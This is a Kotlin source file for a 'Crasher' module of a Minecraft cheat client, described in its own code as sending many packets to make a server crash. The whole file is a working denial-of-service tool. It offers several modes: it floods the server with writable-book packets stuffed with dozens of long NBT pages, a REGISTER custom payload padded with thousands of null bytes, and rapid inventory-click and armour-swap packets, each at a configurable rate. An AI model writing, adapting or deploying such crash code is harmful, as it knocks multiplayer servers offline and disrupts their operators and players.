package club.eridani.epsilon.client.module.misc

import club.eridani.epsilon.client.common.Category
import club.eridani.epsilon.client.event.decentralized.decentralizedListener
import club.eridani.epsilon.client.event.decentralized.events.client.ClientTickDecentralizedEvent
import club.eridani.epsilon.client.module.Module
import club.eridani.epsilon.client.notification.Notification
import club.eridani.epsilon.client.notification.NotificationManager
import club.eridani.epsilon.client.notification.NotificationType
import club.eridani.epsilon.client.util.Timer
import club.eridani.epsilon.client.util.math.floorToInt
import io.netty.buffer.Unpooled
import net.minecraft.init.Items
import net.minecraft.inventory.ClickType
import net.minecraft.inventory.EntityEquipmentSlot
import net.minecraft.item.Item
import net.minecraft.item.ItemArmor
import net.minecraft.item.ItemElytra
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.CPacketClickWindow
import net.minecraft.network.play.client.CPacketCustomPayload
import kotlin.random.Random


object Crasher : Module(
    name = "Crasher",
    category = Category.Misc,
    description = "Sends a lot of packets, making the server crash"
) {

    private var packets by setting("Packets", 4, 1..200, 1)
    private var mode by setting("Mode", Mode.Register)
    private var delay by setting("Delay", 0.0, 0.0..5.0, 0.1)

    var register = false
    private var buffer: PacketBuffer? = null
    private val timer: Timer = Timer()
    private var book: ItemStack? = null

    private const val message =
        "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd"

    enum class Mode(val standardName: String) {
        Book("Book"),
        Register("Register"),
        Armou("Armou"),
        Sign("Sign")
    }

    init {
        decentralizedListener(ClientTickDecentralizedEvent) {

            if (mc.isSingleplayer) return@decentralizedListener

            if (timer.passed((delay * 1000.0).floorToInt())) {
                var i = 0
                while (i < packets) {
                    try {
                        when (mode) {
                            Mode.Book -> {
                                mc.connection?.sendPacket(
                                    CPacketClickWindow(
                                        mc.player.inventoryContainer.windowId,
                                        0,
                                        0,
                                        ClickType.PICKUP,
                                        book,
                                        mc.player.openContainer
                                            .getNextTransactionID(mc.player.inventory)
                                    )
                                )
                            }
                            Mode.Sign -> {
                                val tag = NBTTagCompound()
                                val list = NBTTagList()
                                val size = message
                                repeat((0..50).count()) {
                                    list.appendTag(NBTTagString(size))
                                }
                                tag.setString("author", "AuthSmasher" + Random.nextInt(20))
                                tag.setString("title", "MojangIstToll" + Random.nextInt(20))
                                tag.setInteger("resolved", 1)
                                tag.setTag("pages", list)

                                val book = ItemStack(Items.WRITABLE_BOOK)
                                book.tagCompound = tag

                                val pb = PacketBuffer(Unpooled.buffer())
                                pb.writeItemStack(book)
                                repeat(packets) {
                                    mc.connection?.sendPacket(
                                        CPacketCustomPayload(if (mode == Mode.Sign) "MC|BSign" else "MC|BEdit", pb)
                                    )
                                }
                            }
                            Mode.Register -> {
                                if (buffer == null) {
                                    buffer = PacketBuffer(Unpooled.buffer())
                                    while (i < 32767 / 4) {
                                        buffer!!.writeByte('\u0000'.code)
                                        i++
                                    }
                                }
                                mc.connection!!.sendPacket(CPacketCustomPayload("REGISTER", buffer))
                                register = false
                            }

                            Mode.Armou -> {
                                val chest: Item = mc.player.getItemStackFromSlot(EntityEquipmentSlot.CHEST).item
                                if (chest === Items.AIR) {
                                    val slot = findArmorSlot(EntityEquipmentSlot.CHEST)
                                    if (slot != -1) equiqArmor(slot)
                                } else {
                                    mc.playerController.windowClick(
                                        mc.player.inventoryContainer.windowId,
                                        6,
                                        0,
                                        ClickType.QUICK_MOVE,
                                        mc.player
                                    )
                                }
                            }
                        }
                    } catch (e: Throwable) {
                        e.printStackTrace()
                        toggle()
                        return@decentralizedListener
                    }
                    i++
                }
                timer.reset()
            }
        }

    }

    override fun onEnable() {
        if (mc.isSingleplayer) {
            NotificationManager.show(Notification(message = "Crasher is not available in single player", type = NotificationType.DEBUG))
            return
        }
        if (mode == Mode.Book && mc.player != null) {
            book = ItemStack(Items.WRITABLE_BOOK)
            val list = NBTTagList()
            val tag = NBTTagCompound()
            //IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(c -> c < 0xd800 ? c : c + 0x800);
            //String size = chars.limit(210*50).mapToObj(c -> String.valueOf((char) c)).collect(Collectors.joining());
            val size =
                "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"
            for (b in 0..69) {
                val tString = NBTTagString(size)
                list.appendTag(tString)
            }
            tag.setString("author", "Noblesix")
            tag.setString("title", "I am cute and dont ban me please <3")
            tag.setTag("pages", list)
            book!!.setTagInfo("pages", list)
            book!!.tagCompound = tag
        }
    }

    private fun equiqArmor(slot: Int) {
        mc.playerController.windowClick(mc.player.inventoryContainer.windowId, slot, 0, ClickType.QUICK_MOVE, mc.player)
        mc.playerController.updateController()
        timer.reset()
    }

    private fun findArmorSlot(type: EntityEquipmentSlot): Int {
        var slot = -1
        for (i in 9..44) {
            val item = mc.player.inventoryContainer.getSlot(i).stack
            if (item.item is ItemArmor) {
                val armor = item.item as ItemArmor
                if (armor.armorType == type) {
                    slot = i
                }
            } else if (item.item is ItemElytra) {
                slot = i
            }
        }
        return slot
    }
}